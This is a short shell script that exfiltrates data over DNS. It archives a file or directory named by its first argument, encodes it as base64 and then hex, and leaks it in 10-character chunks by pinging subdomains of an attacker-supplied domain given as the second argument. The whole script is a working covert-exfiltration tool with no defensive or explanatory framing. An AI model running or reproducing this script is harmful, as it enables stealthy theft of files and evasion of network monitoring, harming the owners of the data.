#!/bin/sh
tar -czf data.tar.gz $1 
data=`cat data.tar.gz | base64 | od -A n -t x1 | sed 's/ *//g' | tr -d '\n'`
rm data.tar.gz

i=0
while [ $i -le ${#data} ]
do
   char=$(expr substr "$data" $i 10)
   ping -c 1 -w 0 "$char.$2" &
   i=$(expr $i + 10)
done
